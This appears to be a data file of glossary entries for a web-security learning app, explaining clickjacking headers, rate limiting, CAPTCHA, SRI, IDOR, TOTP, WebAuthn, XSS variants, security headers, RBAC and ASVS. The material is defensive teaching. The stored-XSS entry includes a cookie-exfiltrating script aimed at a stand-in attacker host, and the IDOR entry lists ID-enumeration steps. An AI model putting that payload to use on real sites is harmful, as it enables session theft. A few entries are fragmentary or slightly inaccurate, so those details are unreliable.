words.longDefinition: X-Frame-Options was introduced by Microsoft in Internet Explorer 8 (2009) and subsequently standardized in RFC 7034 (2013). It predates the frame-ancestors CSP directive, which is now preferred. Values: DENY (no framing, by any origin), SAMEORIGIN (framing only by same origin), ALLOW-FROM uri (deprecated, inconsistently supported — use CSP frame-ancestors instead). Clickjacking attack: attacker embeds the target site in a transparent iframe positioned over a button on their decoy page; victim clicks what appears to be a 'play' button but is actually the 'transfer funds' button on the target site's interface. Because the victim is already authenticated, the click executes. Notable clickjacking cases: Adobe Flash Player settings panel (2008) enabled microphone/camera activation via clickjacking; the 'likejacking' attacks (2010) tricked users into liking malicious Facebook pages. The modern approach is CSP frame-ancestors because X-Frame-Options cannot restrict to specific third-party domains (ALLOW-FROM is not supported consistently). Recommended policy: add both X-Frame-Options: SAMEORIGIN and CSP frame-ancestors 'self' for defense in depth across older and newer browsers.
words.connector: Think of X-Frame-Options like a 'no photography' sign in a gallery — it tells other browsers not to take a picture of your page and embed it inside their own exhibit.
words.techContext: We set X-Frame-Options: DENY on all pages that perform user actions, and added frame-ancestors 'none' in CSP as a modern equivalent for browsers that ignore the legacy header.
words.exampleSentence: The security scanner reported missing X-Frame-Options headers on the account deletion page, which could allow a clickjacking attack tricking users into deleting their accounts.
words.etymology: X-Frame-Options uses the 'X-' prefix convention for non-standard experimental headers (deprecated by RFC 6648 but retained because it was already widely deployed before standardization).

words.shortDefinition: Restricting the number of requests a client can make in a time window to prevent brute force and abuse.
words.simpleDefinition: Rate limiting counts requests from an identifier (IP address, user account, API key) within a rolling time window and rejects excess requests with HTTP 429. On authentication endpoints it prevents brute-force and credential-stuffing attacks. On APIs it prevents resource exhaustion and automated scraping. Rate limits must be applied per-account as well as per-IP, since botnets distribute attempts across thousands of IPs.
words.longDefinition: Rate limiting is one of the highest-return defensive controls for authentication endpoints — OWASP lists its absence as a primary enabler of A07 (Identification and Authentication Failures). Strategies: Fixed window (count resets at each interval boundary — vulnerable to burst attacks at window edges); Sliding window log (exact, but memory-intensive — stores each request timestamp); Sliding window counter (approximate, uses two adjacent window counts weighted by overlap — good balance of accuracy and memory); Token bucket (bursts allowed up to bucket capacity; refilled at fixed rate — models real traffic better); Leaky bucket (smooth output rate, drops bursts). For authentication endpoints: 5-10 failed attempts per account per hour is a common threshold. For credential stuffing: per-IP limits are insufficient alone because attackers distribute across IPs; per-account limits, CAPTCHA triggers, and breach-credential detection are complementary. Avoid naive IP-based limits on endpoints behind NAT or CGN (carrier-grade NAT) where thousands of legitimate users share one IP. Rate limit headers: Retry-After (RFC 7231), RateLimit-Limit, RateLimit-Remaining, RateLimit-Reset (IETF draft RateLimit headers). Return HTTP 429 with a Retry-After header to enable well-behaved clients to back off gracefully.
words.connector: Think of rate limiting like a toll booth with a traffic regulator — it lets traffic through steadily but raises the barrier when a single car tries to drive through 100 times in one second.
words.techContext: After enabling per-account rate limiting at 10 failed attempts per 10 minutes on the login endpoint, automated credential stuffing attacks dropped from 50,000 attempts per hour to effectively zero.
words.exampleSentence: The security review found no rate limiting on the password reset endpoint, allowing an attacker to enumerate every registered email address by observing timing differences in the responses.
words.etymology: Rate limiting as a networking concept predates web security — it originates in telecommunications traffic shaping and was adapted for web API access control in the early 2000s.

words.shortDefinition: Challenge presented to distinguish humans from automated bots at login, registration, or high-value action endpoints.
words.simpleDefinition: CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) challenges a user with a task that is easy for humans but difficult for automated bots — distorted text, image selection, or invisible behavioral analysis. Modern CAPTCHAs like Google reCAPTCHA v3 and Cloudflare Turnstile operate in the background, scoring behavior rather than interrupting the user with a visual puzzle.
words.longDefinition: CAPTCHA was coined by Luis von Ahn, Manuel Blum, and colleagues at Carnegie Mellon in 2003. The original visual CAPTCHA (distorted text) has been largely defeated by modern OCR and machine-learning solvers, and CAPTCHA-solving farms offer human solving at pennies per challenge. The field has evolved: (1) reCAPTCHA v2 (image selection challenges); (2) reCAPTCHA v3 (invisible, scores every request 0.0–1.0 based on mouse movement, browsing history, timing; no user interaction required unless score is low); (3) hCaptcha (privacy-focused, GDPR-friendly alternative); (4) Cloudflare Turnstile (passive, cryptographic proof-of-work based). CAPTCHAs are complementary to rate limiting, not a replacement: rate limiting stops volume attacks regardless of automation; CAPTCHA distinguishes human from bot for lower-volume sophisticated attacks. When to require CAPTCHA: account registration (prevent mass fake account creation), login after N failed attempts (slow credential stuffing), password reset, and any endpoint with significant resource cost. CAPTCHA accessibility: audio challenges are required for WCAG 2.1 compliance; invisible behavioral CAPTCHAs have better accessibility but can falsely flag screen reader users. Privacy consideration: reCAPTCHA sends behavioral data to Google; hCaptcha and Turnstile are alternatives for privacy-sensitive applications.
words.connector: Think of CAPTCHA like a bouncer who can spot a robot because humans have nervous little fidgets — micro-hesitations, random mouse movements — that bots execute too perfectly.
words.techContext: We trigger reCAPTCHA v3 on the login endpoint after two failed attempts per account; a score below 0.5 requires the user to solve a v2 challenge before proceeding.
words.exampleSentence: After adding CAPTCHA to the registration flow, the creation of fake accounts for spam dropped by 95%, though we had to tune the threshold to avoid blocking legitimate users on mobile.

codeExample.code:
import httpx

RECAPTCHA_SECRET = 'your_secret_key'
RECAPTCHA_VERIFY_URL = 'https://www.google.com/recaptcha/api/siteverify'

async def verify_recaptcha(token: str, action: str) -> bool:
    """Verify reCAPTCHA v3 token and check action + score."""
    async with httpx.AsyncClient() as client:
        resp = await client.post(RECAPTCHA_VERIFY_URL, data={
            'secret': RECAPTCHA_SECRET,
            'response': token,
        })
    data = resp.json()
    return (
        data.get('success') is True
        and data.get('action') == action
        and data.get('score', 0) >= 0.5   # tune threshold for your traffic
    )

words.etymology: CAPTCHA is a backronym coined at Carnegie Mellon in 2003: Completely Automated Public Turing test to tell Computers and Humans Apart, playing on Alan Turing's imitation game.

words.shortDefinition: Browser mechanism that verifies the cryptographic hash of cross-origin scripts or stylesheets before execution.
words.simpleDefinition: Subresource Integrity (SRI) lets you pin a script or stylesheet to a specific cryptographic hash. When the browser loads a cross-origin resource — a CDN-hosted library — it computes the hash of the downloaded file and compares it to the integrity attribute. If they do not match, the resource is blocked. This protects against CDN compromise, where an attacker injects malicious code into a popular library.
words.longDefinition: Subresource Integrity (SRI) is a W3C specification implemented in all modern browsers since 2016. It is applied by adding an integrity attribute to <script> and <link> elements: <script src="https://cdn.example.com/lib.js" integrity="sha384-abc..." crossorigin="anonymous">. The hash is computed over the exact bytes of the resource (after any transfer encoding is removed). Multiple hash algorithms can be specified space-separated; the browser uses the strongest it supports. Supported algorithms: sha256, sha384 (recommended), sha512. The crossorigin="anonymous" attribute is required when using SRI with CORS — without it, for responses requiring CORS headers, the browser cannot read the response body to hash it. When to use SRI: any <script> or <link> loaded from a CDN or external origin. When not to use SRI: resources loaded dynamically at runtime via fetch/XHR (no integrity verification mechanism in the Fetch API for older browsers); resources that change frequently and would require constant hash updates. SRI does not protect against: (1) a compromised package registry (the source your CI/CD builds from); (2) first-party CDN-hosted resources; (3) script loaded from your own origin. For own-origin resources, a nonce-based CSP is the appropriate control. SRI is specifically the defense for the supply-chain risk of third-party CDN compromise.
words.connector: Think of SRI like a signed delivery receipt — you order a specific book, and when it arrives you check the seal number matches what the publisher printed. If someone swapped the contents in transit, the seal won't match.
words.techContext: After the Polyfill.io CDN compromise in 2024, we audited all CDN-hosted scripts and added SRI hashes to every external dependency, blocking any tampered version from executing.
words.exampleSentence: The security policy required SRI attributes on all CDN-hosted scripts; when the CDN was briefly compromised during a supply chain attack, the injected malicious code was blocked by browsers enforcing the hash check.

codeExample.code:
<!-- SRI for a CDN-hosted JavaScript library -->
<!-- Generate hash: openssl dgst -sha384 -binary lib.js | openssl base64 -A -->
<script
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha384-T1L3DMnEUL72lcNkHzk1fmNk0Hh1HFzU1O7bBbS1BXUK5ABuJ8lmRsApV+TLQAM"
  crossorigin="anonymous"
  referrerpolicy="no-referrer">
</script>

<!-- SRI for a CDN-hosted stylesheet -->
<link
  rel="stylesheet"
  href="https://cdn.example.com/styles.css"
  integrity="sha384-xyz..."
  crossorigin="anonymous">

words.etymology: Subresource Integrity combines 'subresource' (any resource loaded by the page, as opposed to the page itself) with 'integrity' (ensuring the content has not been altered); standardized by the W3C in 2016.

words.shortDefinition: Insecure Direct Object Reference; application exposes internal IDs without verifying the caller owns that resource.
words.simpleDefinition: IDOR occurs when an API or web endpoint returns or modifies a resource identified by a user-controlled value (an ID, filename, or key) without checking that the requester is authorized to access that specific resource. Changing /api/orders/1001 to /api/orders/1002 retrieves someone else's order if the server only checks authentication (who you are) but not authorization (whether you own order 1002).
words.longDefinition: IDOR was formally named in the OWASP Top 10 2007 edition and remains one of the most prevalent and exploited vulnerability classes. It is a specialization of Broken Access Control (OWASP A01 in 2021) and the API equivalent appears as BOLA (Broken Object Level Authorization, OWASP API Top 10 #1). The root cause: the application exposes internal database IDs, filenames, or sequence numbers as resource identifiers in URLs or request bodies, and performs authentication but not per-resource authorization. Exploitation: increment/decrement the ID in the URL or request body; fuzz UUIDs if used; look for IDs returned in one API response and used in another. Real-world impact: the 2019 Venmo API exposed transaction metadata for any transaction ID without authentication; the 2022 Optus breach exposed customer data via an unauthenticated API with sequential customer IDs; the 2021 Peloton API returned full user profiles for any user ID without authentication. Mitigations: always perform per-resource ownership checks server-side; use UUIDs or opaque tokens instead of sequential integers (security through obscurity — does not fix authorization, but raises the bar); implement indirect object references (map internal IDs to per-user tokens); log and alert on repeated 403s against different object IDs (IDOR reconnaissance pattern).
words.connector: Think of IDOR like a mailroom where each employee's mail slot has a number — if the clerk gives you any mail you ask for by number without checking your name, anyone can request slot 247 and read your mail.
words.techContext: The authorization middleware now enforces resource-level ownership checks: every database query for a user-owned object includes a WHERE owner_id = :current_user clause, preventing IDOR at the query level.
words.exampleSentence: The bug bounty submission demonstrated an IDOR in the invoice endpoint — by incrementing the invoice ID in the URL, the researcher retrieved invoices from other companies sharing the same application.
words.etymology: Insecure Direct Object Reference was coined for the OWASP Top 10 2007; 'direct object reference' describes the pattern of using internal storage identifiers directly in the URL or request without indirection.

words.shortDefinition: Time-based One-Time Password; six-digit code generated by an authenticator app, valid for ~30 seconds.
words.simpleDefinition: TOTP generates a six-digit OTP by combining a shared secret (enrolled during setup) with the current Unix timestamp divided into 30-second windows, then applying HMAC-SHA1. Both the authenticator app and the server compute the same value from the same inputs. The code changes every 30 seconds, so a stolen code is useless after the window expires — unless an attacker relays it in real time.
words.longDefinition: TOTP is defined in RFC 6238 (2011), building on HMAC-based OTP (HOTP, RFC 4226). The algorithm: T = floor((current_time - T0) / step_size) where T0 is Unix epoch and step_size is 30 seconds; OTP = HOTP(secret, T) = HMAC-SHA1(secret, T) truncated to 6 digits. Implementation notes: the server should accept a window of ±1 step (±30 seconds) to account for clock drift; storing the previously used OTP and rejecting re-use prevents replay within the same window. TOTP is the dominant TOTP standard — Google Authenticator, Authy, Microsoft Authenticator, 1Password, and Bitwarden all implement RFC 6238. Enrollment: the shared secret is encoded as a base32 string and delivered to the authenticator app via a QR code URI (otpauth://totp/...). Security considerations: (1) the shared secret is a long-term credential — if leaked, all future codes can be generated; store it as securely as a password in the database; (2) TOTP is not phishing-resistant — a real-time proxy can relay codes within the 30-second window; this is how the Uber 2022 breach bypassed TOTP MFA; (3) for phishing-resistant MFA, use WebAuthn/passkeys instead; (4) recovery codes must be generated and stored securely — they bypass TOTP entirely.
words.connector: Think of TOTP like a combination lock that changes its combination every 30 seconds based on a clock synchronized between you and the bank — only someone who has the same clock and secret key can predict the right combination.
words.techContext: We implemented TOTP using a standard RFC 6238 library with a ±1 window for clock drift tolerance and store the last-used OTP to prevent replay attacks within the same time step.
words.exampleSentence: After the phishing simulation showed that 30% of employees entered their TOTP codes on the fake site, the security team began evaluating passkeys as a phishing-resistant replacement.

codeExample.code:
import pyotp
import time

# Server-side TOTP verification
def verify_totp(
    user_secret: str,
    submitted_code: str,
    last_used_code: str | None
) -> bool:
    totp = pyotp.TOTP(user_secret)

    # valid_window=1 accepts T-1, T, and T+1 (±30 seconds clock drift)
    if not totp.verify(submitted_code, valid_window=1):
        return False

    # Replay prevention: reject the same code within its validity window
    if submitted_code == last_used_code:
        return False

    # Store submitted_code as last_used_code in the database
    return True

words.etymology: TOTP stands for Time-based One-Time Password; it extends HOTP (HMAC-based OTP, RFC 4226) by replacing the counter with the current timestamp, producing time-synchronized codes.

words.shortDefinition: W3C standard enabling public-key authentication via hardware security keys or device biometrics; the basis for passkeys.
words.simpleDefinition: WebAuthn is the browser API that implements FIDO2 authentication. It lets a website ask the browser to perform a cryptographic ceremony with an authenticator — a hardware key, device biometric, or platform authenticator. The server receives a signed assertion tied to the specific origin, making it impossible to replay credentials from a phishing site.
words.longDefinition: WebAuthn (Web Authentication) became a W3C Recommendation in March 2019. It is the browser component of the FIDO2 standard (the other component is CTAP2, which governs how external authenticators communicate with the browser via USB, NFC, or Bluetooth). The registration ceremony: (1) server sends a challenge + relying party ID (rpId, typically the domain); (2) browser calls navigator.credentials.create() to invoke the authenticator; (3) authenticator generates a key pair, ties the public key to the rpId, stores the private key securely; (4) browser returns the public key, credential ID, and an attestation statement to the server; (5) server stores the public key and credential ID. The authentication ceremony: server sends a fresh challenge; browser calls navigator.credentials.get(); authenticator signs the challenge with the stored private key; server verifies the signature using the stored public key. The rpId binding is the phishing-resistant property: a WebAuthn response generated at auth.evil.com will fail verification for auth.example.com because the rpId is embedded in the signed client data. Authenticator types: platform authenticators (Touch ID, Face ID, Windows Hello — bound to device, support multi-device sync as passkeys); roaming authenticators (YubiKey, etc. — hardware security keys, highest assurance). WebAuthn supports attestation formats (packed, FIDO U2F, Android SafetyNet, TPM) for verifying authenticator model and manufacturer.
words.connector: Think of WebAuthn like a notarized document process — the authenticator acts as a notary that stamps a unique signed seal for each challenge, and the seal can only have been made by the specific device registered for that specific website.
words.techContext: We implemented WebAuthn registration and authentication using the @simplewebauthn/server library; platform authenticators on iOS and Android transparently create passkeys that sync across the user's devices.
words.exampleSentence: After deploying WebAuthn alongside TOTP, the security team found that WebAuthn-authenticated sessions had a zero phishing-based account takeover rate compared to the 2% rate for TOTP sessions.
words.etymology: WebAuthn is an abbreviation of Web Authentication; it is jointly published by the W3C and the FIDO Alliance, combining 'Web' (the browser API layer) with 'Authn' (the authentication function).

words.shortDefinition: XSS variant where attacker-controlled data flows through the DOM to an unsafe sink without touching the server.
words.simpleDefinition: DOM-based XSS occurs entirely in the browser. The attacker injects a payload into a source the browser exposes (location.hash, location.search, document.referrer, postMessage) and it flows through JavaScript to an unsafe sink (innerHTML, eval(), document.write) without the server ever seeing the malicious input. The server response is clean; only the browser is the victim.
words.longDefinition: DOM-based XSS was first classified by Amit Klein in 2005 and is fundamentally different from reflected or stored XSS: the server response contains no payload. The vulnerability exists in client-side JavaScript that reads from a taint source and writes to a dangerous sink without sanitization. Taint sources (attacker-controlled values read by JS): location.href, location.hash, location.search, document.URL, document.referrer, window.name, postMessage data, IndexedDB data, localStorage/sessionStorage (if populated by another vulnerability). Unsafe sinks (operations that can interpret strings as code or markup): element.innerHTML, element.outerHTML, document.write(), document.writeln(), eval(), setTimeout(string), setInterval(string), Function(string), jQuery's $(attacker_string), location.href (open redirect). A payload example: the URL https://example.com/page# — if JS reads location.hash and writes it to innerHTML, the XSS fires. DOM-based XSS is harder to detect with server-side DAST scanners because the payload never reaches the server; browser-side analysis tools (Burp's DOM Invader, taint analysis engines) are required. The defense: use textContent instead of innerHTML for text insertion; use DOM creation methods (createElement, createTextNode) instead of HTML string concatenation; apply DOMPurify for cases where HTML rendering is required; use Trusted Types to block unsafe DOM sinks at the browser level.
words.connector: Think of DOM-based XSS like a local drug smuggling ring that never crosses a border checkpoint — the contraband (payload) moves entirely within the city (browser), making border (server-side) security ineffective.
words.techContext: Our client-side code audit found ten locations where location.hash was written to innerHTML; we replaced each with textContent or DOMPurify.sanitize() to eliminate the DOM-XSS attack surface.
words.exampleSentence: The DOM-based XSS escaped the WAF entirely because the payload never hit the server — it lived in the URL fragment and was processed exclusively by the client-side router's template injection.
words.etymology: DOM-based XSS is named for the Document Object Model (DOM), the browser's in-memory tree representation of a web page, which is the medium through which the attack flows; first documented by Amit Klein in 2005.

words.shortDefinition: XSS payload persisted in the database and served to every user who views the affected page.
words.simpleDefinition: Stored (persistent) XSS is the most dangerous XSS variant. The attacker submits a malicious script in user-generated content — a comment, profile bio, or message — and the server stores it in the database. Every user who loads the page with that content receives the payload and executes it, giving the attacker persistent code execution in the browsers of an unlimited number of victims.
words.longDefinition: Stored XSS differs from reflected XSS in its persistence and scale: one submission compromises every subsequent visitor. Attack vectors: any input stored to a database and later rendered as HTML — forum posts, comments, profile names, product reviews, chat messages, file names. A classic stored XSS payload: <script>document.location='https://attacker.com/steal?cookie='+document.cookie</script> inserted into a comment field. If the comment is rendered without output encoding, every reader's session cookie is exfiltrated. Session cookies with HttpOnly prevent JS cookie access but do not prevent other XSS abuse (CSRF, DOM manipulation, credential harvesting). High-impact real-world cases: the Samy Worm (2005) — a MySpace stored XSS that added the attacker as a friend and replicated itself to each visitor's profile; the British Airways breach (2018, disputed attribution) — a script skimmer injected into the payment page exfiltrated 380,000 payment records. The fundamental defense: output-encode all user-supplied data when rendering in HTML context. The encoding context matters: HTML entity encoding for HTML content (<, >, &, ", '), JavaScript string encoding for data in script blocks, URL encoding for href/src attributes. Template engines like Jinja2, Handlebars, and React's JSX apply context-aware auto-escaping by default — disabling it (|safe, dangerouslySetInnerHTML) re-opens the vulnerability.
words.connector: Think of stored XSS like a poisoned water cooler — one person adds the poison (attacker submits payload), and every person who drinks (visits the page) is affected, not just the one who was targeted.
words.techContext: The penetration test found stored XSS in the user bio field; sanitizing the output with context-aware encoding in the Jinja2 template fixed all 47 related instances because we use auto-escaping globally.
words.exampleSentence: The stored XSS in the support ticket title field went undetected for three weeks; every support agent who opened a ticket with that title had their session cookie exfiltrated.
words.etymology: Stored XSS is also called persistent XSS because the payload persists in the server's data store; the 'stored' name distinguishes it from reflected (non-persistent) and DOM-based variants.

words.simpleDefinition: Reflected XSS requires tricking a specific victim into clicking a crafted URL. The payload is not stored on the server — it travels in the URL as a query parameter or fragment. The server includes it in the HTML response without encoding, and the browser executes it. The attack scope is one victim per click, but a phishing email or short URL can deliver it at scale.

words.shortDefinition: HTTP response headers (CSP, HSTS, X-Frame-Options, etc.) that activate browser-enforced security policies.
words.simpleDefinition: Security headers are HTTP response headers that instruct the browser to apply specific security policies to a page. They are one of the highest-leverage defensive mechanisms because they can neutralize entire vulnerability classes — CSP for XSS, HSTS for SSL stripping, X-Frame-Options for clickjacking — with a single configuration change rather than code-level fixes.
words.longDefinition: Security headers represent the browser's side of defense-in-depth: even if server-side controls fail (XSS bypass, injection), browser-enforced policies provide a backstop. The core security headers: (1) Content-Security-Policy — restricts script/style/resource sources, prevents XSS execution; (2) Strict-Transport-Security — forces HTTPS, prevents SSL stripping and cookie hijacking; (3) X-Frame-Options — prevents clickjacking iframe embedding (superseded by CSP frame-ancestors); (4) X-Content-Type-Options: nosniff — prevents MIME sniffing attacks where browsers interpret a response as a different content type; (5) Referrer-Policy — controls how much of the URL is sent in the Referer header (privacy and information leakage); (6) Permissions-Policy (formerly Feature-Policy) — controls browser feature access (camera, microphone, geolocation) by origin; (7) Cross-Origin-Opener-Policy (COOP) and Cross-Origin-Embedder-Policy (COEP) — isolate cross-origin resources to prevent Spectre-style attacks. Security header auditing: securityheaders.com provides a free scanner and grade. Common misconfiguration: deploying headers only on the home page rather than all responses; setting an overly permissive CSP with unsafe-inline that negates XSS protection. Operational approach: deploy new headers in report-only mode first, monitor violations, then switch to enforcement.
words.connector: Think of security headers like the safety features on a modern car — airbags, lane-keeping, automatic braking: your server sends a response, and the browser's built-in safety systems activate based on the instructions.
words.techContext: Running securityheaders.com against our app revealed missing X-Content-Type-Options and Referrer-Policy headers; we added a middleware that applies all security headers to every response in under two hours.
words.exampleSentence: The compliance audit required a minimum security header score of A on securityheaders.com, so the team added a centralized middleware that applies CSP, HSTS, X-Frame-Options, and X-Content-Type-Options to every response.

codeExample.code:
from flask import Flask

app = Flask(__name__)

# Centralized security headers middleware
@app.after_request
def add_security_headers(response):
    response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains; preload'
    )
    response.headers['X-Content-Type-Options']  = 'nosniff'
    response.headers['X-Frame-Options']         = 'SAMEORIGIN'
    response.headers['Referrer-Policy']         = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy']      = (
        'camera=(), microphone=(), geolocation=()'
    )
    # CSP set separately (nonce-based, per-request)
    return response

words.etymology: Security headers is an informal collective term for HTTP response headers that activate defensive browser behaviors; individual headers have independent origins spanning 2009 (X-Frame-Options) through 2021 (Cross-Origin-Opener-Policy).

words.shortDefinition: Role-Based Access Control; permissions are assigned to roles, and users are granted roles rather than direct permissions.
words.simpleDefinition: RBAC decouples permissions from individual users. Instead of granting Alice permission to delete orders, you create an 'orders-admin' role with delete permission and assign Alice that role. When Alice leaves or her responsibilities change, you modify role assignments — not every individual permission grant. This scales cleanly across thousands of users and hundreds of permissions.
words.longDefinition: Role-Based Access Control (RBAC) was formalized by NIST in 1992 (RBAC96 model) and remains the dominant access control model for enterprise applications, cloud IAM systems (AWS IAM roles, Kubernetes RBAC), and APIs. Core concepts: Subject (user or service), Role (named collection of permissions), Permission (allowed action on a protected resource), and Role Assignment (mapping subjects to roles). RBAC models: flat RBAC (all permissions in one level), hierarchical RBAC (role inheritance — 'senior-admin' inherits from 'admin'), constrained RBAC (separation-of-duty rules — cannot hold conflicting roles simultaneously). Implementation patterns in web applications: (1) database-backed — roles and permissions stored in relational tables with a join table for assignments; (2) JWT claims — user roles encoded in the token, checked server-side per endpoint; (3) policy engine — OPA (Open Policy Agent) or Casbin for complex multi-dimensional rules. Common RBAC mistakes: role explosion (hundreds of granular roles, difficult to audit); assigning too many roles by default; not implementing Separation of Duty (SoD) for sensitive workflows; checking roles in the UI rather than the API (hiding is not authorizing). RBAC vs ABAC: RBAC is simple and auditable; ABAC (Attribute-Based Access Control) is more expressive (permits/denies based on user attributes, resource attributes, and environment context) but complex to implement and audit. Google's Zanzibar (2019) describes the Relationship-Based Access Control (ReBAC) model used by Google Drive and Docs — a graph-based extension of RBAC.
words.connector: Think of RBAC like a job title system in a company — your job title (role) determines which rooms you can enter and which filing cabinets you can open; when you change departments, the title changes and access changes with it.
words.techContext: We use Casbin for RBAC enforcement in the API layer; roles are stored in the database and synced to the JWT claims at login, with the policy engine enforcing them per endpoint.
words.exampleSentence: The RBAC model consolidated 47 individual permission grants per user into 6 roles, cutting the annual access review from three weeks to two days.

import casbin

# Casbin policy file (policy.csv):
# p, admin, /admin/*, *
# p, editor, /posts, GET
# p, editor, /posts, POST
# p, editor, /posts/:id, PUT
# g, alice, admin
# g, bob, editor

enforcer = casbin.Enforcer('model.conf', 'policy.csv')

def authorize(user: str, path: str, method: str) -> bool:
    if not enforcer.enforce(user, path, method):
        raise PermissionError(f'{user} is not authorized to {method} {path}')
    return True

words.etymology: RBAC was formally named Role-Based Access Control by Ferraiolo and Kuhn at NIST in 1992, though the underlying concept of grouping access rights into roles existed in mainframe security systems since the 1970s.

words.shortDefinition: Application Security Verification Standard; structured checklist of security controls at three levels of rigor.
words.simpleDefinition: OWASP ASVS turns the Top 10 awareness list into a testable verification framework. It organizes hundreds of specific security requirements across 14 control areas into three levels of rigor. Level 1 is verifiable by automated scanning; Level 2 requires code review; Level 3 is for critical applications requiring formal security architecture evidence.
words.longDefinition: The OWASP Application Security Verification Standard (ASVS) was first released in 2008 and is now in version 5.0 (2025), the current authoritative edition. It is organized into 14 chapters: architecture, authentication, session management, access control, validation/sanitization/encoding, stored cryptography, error handling, data protection, communications, malicious code, business logic, files/resources, APIs/web services, and configuration. Three verification levels: V1 (Opportunistic) — verifiable through automated testing, DAST, and basic pen testing; V2 (Standard) — verifiable through code review plus testing; V3 (Advanced) — formal architecture and threat model documentation required. ASVS v5.0 changes include a new Cryptography chapter incorporating post-quantum guidance, restructured access control requirements, and expanded API security controls. Primary use cases: (1) development guidance — teams map ASVS requirements to user stories and acceptance criteria before writing code; (2) penetration test scope — standardizes what an assessment covers, making results comparable; (3) procurement — buyers require ASVS Level 2 compliance from vendors as a contractual baseline. The relationship to the Top 10: the Top 10 says 'these are the ten most dangerous patterns'; ASVS says 'here are the specific controls to prevent them and how to verify they work'. ASVS Level 2 is the appropriate target for most business applications handling sensitive data; regulated industries (healthcare, finance) should target Level 3.
words.connector: Think of OWASP ASVS like an inspector's checklist for a building code — the Top 10 tells you which building failures kill people, while ASVS tells you exactly which bolts to check, what torque rating to use, and how to document the inspection.
words.techContext: Our security team uses ASVS Level 2 requirements as acceptance criteria in Jira; every new feature has an ASVS mapping, and the security engineer signs off that each applicable control is implemented before release.
words.exampleSentence: The fintech startup used OWASP ASVS Level 2 as their security requirements specification during development, which allowed the external pen test to proceed with a clear scope and comparable results.
